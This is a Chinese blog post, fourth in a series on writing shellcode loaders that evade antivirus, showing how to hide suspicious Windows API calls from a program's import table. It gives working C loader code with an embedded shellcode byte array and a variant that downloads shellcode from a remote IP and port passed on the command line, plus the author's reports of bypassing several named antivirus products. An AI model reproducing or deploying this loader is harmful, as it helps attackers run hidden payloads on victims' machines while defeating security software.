@@ -1,0 +1,290 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>从0开始写ShellCode加载器0x4-隐藏导入表 | Lucky Future的技术栈</title><meta name="keywords" content="android,安全,渗透测试,逆向"><meta name="author" content="LuckyFuture"><meta name="copyright" content="LuckyFuture"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="学习隐藏导入地址表技术">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从0开始写ShellCode加载器0x4-隐藏导入表">
+<meta property="og:url" content="http://luckyfuture.top/BypassAVLearning4.html">
+<meta property="og:site_name" content="Lucky Future的技术栈">
+<meta property="og:description" content="学习隐藏导入地址表技术">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328215223222.png">
+<meta property="article:published_time" content="2022-03-28T13:50:20.000Z">
+<meta property="article:modified_time" content="2022-03-28T14:00:19.270Z">
+<meta property="article:author" content="LuckyFuture">
+<meta property="article:tag" content="android,安全,渗透测试,逆向">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328215223222.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://luckyfuture.top/BypassAVLearning4"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?1347df1bbc1626b89dd2cc1d362b984c";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-978LXQR6H1"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-978LXQR6H1');
+</script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-03-28 22:00:19'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}const fontSizeVal = saveToLocal.get('global-font-size')
+if (fontSizeVal !== undefined) {
+  document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+}})()</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/rss.xml" title="Lucky Future的技术栈" type="application/rss+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328215223222.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Lucky Future的技术栈</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">从0开始写ShellCode加载器0x4-隐藏导入表</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-28T13:50:20.000Z" title="发表于 2022-03-28 21:50:20">2022-03-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-28T14:00:19.270Z" title="更新于 2022-03-28 22:00:19">2022-03-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80/">木马免杀</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/BypassAVLearning4.html#post-comment"><span class="waline-comment-count" id="/BypassAVLearning4.html"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>这是从0开始写ShellCode加载器的第4篇文章，文章列表，样本demo已上传到<a target="_blank" rel="noopener" href="https://github.com/luckyfuture0177/ReZeroBypassAV">GitHub</a></p>
+</blockquote>
+<p>杀毒软件扫描原理大体上可以分为三种，文件扫描，内存扫描，行为监控。其中文件和内存都是基于特征来进行扫描的。磁盘中的文件可以看作静态特征，内存中的数据可以看作动态特征。那么一个什么样的文件会被识别为病毒木马呢？</p>
+<p>在开始此之前我们需要了解一些PE文件结构相关知识：导入地址表</p>
+<blockquote>
+<p><em>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。 - 来源百度百科</em></p>
+</blockquote>
+<p>我们经常听到导出表和导入表两个词，简单来说，导出表的功能是将自身的函数，类等资源供其它程序调用，提供这类功能的程序叫做动态链接库DLL。而导入表的功能帮助程序调用DLL中的资源。</p>
+<p>关于PE文件结构的更多信息，可以到我这篇文章中查看。</p>
+<p>我们来分析一下<a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/BadCode/blob/master/BadCode/Source.cpp">第一课代码</a>编译出来的exe文件，使用PEview工具查看。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220327160657184.png" alt="image-20220327160657184"></p>
+<p>在文件的导入地址表中，代码中调用的api一览无遗，<code>Virtual Alloc</code>、<code>CreateThread</code>这类函数是杀毒软件重点关注的对象，一个几十kb的程序调用了这些函数，极有可能是木马病毒。</p>
+<p>因此我们尝试在PE文件中抹去导入函数的名称。</p>
+<p>我们尝试自己定义他们的函数指针，然后利用<code>GetProcAddress</code>获取函数地址，调用自己的函数名称。</p>
+<p>自定义函数指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//typedef用于类型定义，他允许用户为已经存在的数据类型起一个别名</span></span><br><span class="line"><span class="comment">//WINAPI 意味 __stdcall，是一种函数调用方式，stdcall调用方式的函数声明为：int _stdcall function(int a, int b);</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">stdcall的调用方式意味着：</span></span><br><span class="line"><span class="comment">（1） 参数从右向左依次压入堆栈</span></span><br><span class="line"><span class="comment">（2） 由被调用函数自己来恢复堆栈</span></span><br><span class="line"><span class="comment">（3） 函数名自动加前导下划线，后面紧跟着一个@,其后紧跟着参数的尺寸</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//微软文档对VirtualAlloc函数的定义</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">LPVOID VirtualAlloc(</span></span><br><span class="line"><span class="comment">  [in, optional] LPVOID lpAddress,</span></span><br><span class="line"><span class="comment">  [in]           SIZE_T dwSize,</span></span><br><span class="line"><span class="comment">  [in]           DWORD  flAllocationType,</span></span><br><span class="line"><span class="comment">  [in]           DWORD  flProtect</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LPVOID</span><span class="params">(WINAPI* ImportVirtualAlloc)</span><span class="params">(</span></span><br><span class="line"><span class="params">	LPVOID lpAddress,</span></span><br><span class="line"><span class="params">	SIZE_T dwSize,</span></span><br><span class="line"><span class="params">	DWORD  flAllocationType,</span></span><br><span class="line"><span class="params">	DWORD  flProtect</span></span><br><span class="line"><span class="params">	)</span>;</span><br><span class="line"><span class="comment">//上述代码可以看作自己定义一个函数名为ImportVirtualAlloc，返回值、参数和VirtualAlloc相同的函数。</span></span><br><span class="line"><span class="comment">//下面的定义同理。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* ImportCreateThread)</span><span class="params">(</span></span><br><span class="line"><span class="params">	LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span><br><span class="line"><span class="params">	SIZE_T                  dwStackSize,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE  lpStartAddress,</span></span><br><span class="line"><span class="params">	__drv_aliasesMem LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	DWORD                   dwCreationFlags,</span></span><br><span class="line"><span class="params">	LPDWORD                 lpThreadId)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI* ImportVirtualProtect)</span><span class="params">(</span></span><br><span class="line"><span class="params">	LPVOID lpAddress,</span></span><br><span class="line"><span class="params">	SIZE_T dwSize,</span></span><br><span class="line"><span class="params">	DWORD  flNewProtect,</span></span><br><span class="line"><span class="params">	PDWORD lpflOldProtect</span></span><br><span class="line"><span class="params">	)</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>GetProcAddress</code>函数用法</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FARPROC <span class="title function_">GetProcAddress</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HMODULE hModule, <span class="comment">//包含函数或变量的 DLL 模块的句柄。LoadLibrary、 LoadLibraryEx、LoadPackagedLibrary或 GetModuleHandle函数返回此句柄。</span></span></span><br><span class="line"><span class="params">  [in] LPCSTR  lpProcName <span class="comment">//函数或变量名，或函数的序数值。如果该参数为序数值，则必须在低位字中；高位字必须为零。</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//如果函数成功，则返回值是导出的函数或变量的地址。</span></span><br><span class="line"><span class="comment">//如果函数失败，则返回值为 NULL。要获取扩展的错误信息，请调用 GetLastError。</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在<code>main</code>函数中，定义四个函数指针来存放这些函数的地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">ImportCreateThread MyCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">ImportVirtualProtect MyVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>接下来在代码中的函数换成自己定义的指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> shellcode_size = <span class="number">0</span>;</span><br><span class="line">	DWORD dwThreadId; <span class="comment">//线程id</span></span><br><span class="line">	HANDLE hThread;<span class="comment">//线程句柄</span></span><br><span class="line">	DWORD dwOldProtect; <span class="comment">//内存页属性</span></span><br><span class="line">	<span class="type">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x82\x0\x0\x0\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\xc\x8b\x52\x14\x8b\x72\x28\xf\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x2\x2c\x20\xc1\xcf\xd\x1\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x1\xd1\x51\x8b\x59\x20\x1\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x1\xd6\x31\xff\xac\xc1\xcf\xd\x1\xc7\x38\xe0\x75\xf6\x3\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x1\xd3\x66\x8b\xc\x4b\x8b\x58\x1c\x1\xd3\x8b\x4\x8b\x1\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x1\x8d\x85\xb2\x0\x0\x0\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x6\x7c\xa\x80\xfb\xe0\x75\x5\xbb\x47\x13\x72\x6f\x6a\x0\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x0\x0&quot;</span>;</span><br><span class="line">	shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* shellcode = (<span class="type">char</span>*)MyVirtualAlloc(</span><br><span class="line">		<span class="literal">NULL</span>,<span class="comment">//基址</span></span><br><span class="line">		shellcode_size,  <span class="comment">//大小</span></span><br><span class="line">		MEM_COMMIT, <span class="comment">//内存页状态</span></span><br><span class="line">		PAGE_READWRITE <span class="comment">//可读可写可执行</span></span><br><span class="line">	);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//CopyMemory(shellcode, buf, shellcode_size);</span></span><br><span class="line">	<span class="built_in">memcpy</span>(shellcode, buf, shellcode_size);</span><br><span class="line">	MyVirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line">	hThread = MyCreateThread(</span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">		(LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">		&amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">	);</span><br><span class="line">	MyWaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再用peview查看一下新生成的程序</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328083854215.png" alt="image-20220328083854215"></p>
+<p>导入表中已经没有<code>Virtual Alloc</code>、<code>CreateThread</code>这些函数了</p>
+<p>将隐藏导入表代码和分离免杀的代码合并。检验一下效果。火绒，360静动全过，defender静态过了，动态被杀。暂时不上传virustotal检测了，之前检测率7/65的木马，今天再上传已经是23/65了，看来杀软也在分析标记virustotal上的样本。除了颠覆性的技术出现让所有杀软都检测不出来，免杀大多数时候过主流杀软就可以了。</p>
+<p>通过命令行参数将shellcode地址传给程序，避免暴露ip等信息。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span>* data;</span><br><span class="line">	<span class="type">char</span> *ip = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="type">int</span> port = stoi(argv[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">char</span> *filename = argv[<span class="number">3</span>];</span><br><span class="line">	data = WinGet(ip, port, filename);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;返回的数据为: &quot;</span> &lt;&lt; data &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; argc;</span><br><span class="line">	<span class="type">char</span>* buf = StrToShellcode(data);</span><br><span class="line">	load(buf, <span class="number">2048</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">LuckyFuture</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://luckyfuture.top/BypassAVLearning4.html">http://luckyfuture.top/BypassAVLearning4.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/%E7%9F%A5%E8%AF%86%E5%85%B1%E4%BA%AB%E8%AE%B8%E5%8F%AF%E5%8D%8F%E8%AE%AE" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://luckyfuture.top" target="_blank">Lucky Future的技术栈</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328215223222.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/BypassAVLearning5.html"><img class="prev-cover" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220330225031462.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">从0开始写ShellCode加载器0x5-代码混淆</div></div></a></div><div class="next-post pull-right"><a href="/CppAndC-Pointer.html"><img class="next-cover" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328172923202.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">从0开始写ShellCode加载器0x3-C++/C指针详解</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Waline</span><span class="switch-btn"></span><span class="second-comment">Disqusjs</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">LuckyFuture</div><div class="author-info__description">欢迎来到lucky future的技术栈，专注移动安全与渗透测试</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/luckyfuture0177"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/luckyfuture0177" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:luckyfuture177@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/yanjiusheng3year.html" 